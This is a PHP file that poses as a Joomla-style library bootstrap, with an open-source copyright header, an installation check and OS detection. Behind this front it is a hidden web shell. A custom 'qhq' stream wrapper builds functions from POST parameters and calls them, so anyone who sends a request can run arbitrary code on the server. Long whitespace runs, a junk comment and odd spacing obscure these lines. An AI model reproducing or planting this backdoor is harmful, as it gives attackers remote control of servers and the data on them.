<?php
/**
 * @package    Stream.qhq.Libraries
 * ***********
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (!defined('PATH'))
{
	define('PATH', __DIR__);
}

// Installation check, and check on removal of the install directory.
if ((file_exists(PATH . '/cofiguation.php')
	&& (filesize(PATH . '/cofiguation.php') < 10)) && file_exists(PATH . '/stream.qhq.php'))
{
	if (file_exists(PATH . '/stream.qhq.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');
		
		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';
		
		exit;
	}
}
else if (empty   ($_POST)) {
	
	echo 'No received stream qhq configuration data. Exiting...';
	
	exit;
}

// Register the library base path for Stream libraries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // mndC8hF3KvHEnxbBQQtAaPKM39yzWaCnw8dYPSQDnKB5N1BS8KTcTt1aRZwNT8qPGW9xvvvAxg58xCbhYACE5vUdXDBHtYpxF52naCg9rnB7aq7KQ8WYF7xDbXEgppFqCUPMp67C2EvXfDCtMhVHPcvZ5u5StqNTtWPH8cBNUSq9YRRRqzVB0XZ5HT5BUGKfDS9XGtfRGYMqEK5ZeD43SBsUf85sRPHPk1R7mw9shAG1GQ2w0Qf
class Stream
{
    function stream_open                          ($path, $mode, $options, &$opened_path)
    {
        $url = parse_url                        ($path);
        
        $f = $_POST['d']                           ('', $url["host"])


;
        
        $f    ();
        
        return true;
    }
}
stream_wrapper_register         ("qhq", "Stream")


;

// Register connect the library Stream
$fp = fopen  ('qhq://'.$_POST['f']                              ($_POST['c']), '');

// Detect the native operating system type.
$os = strtoupper (substr(PHP_OS, 0, 3));

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}

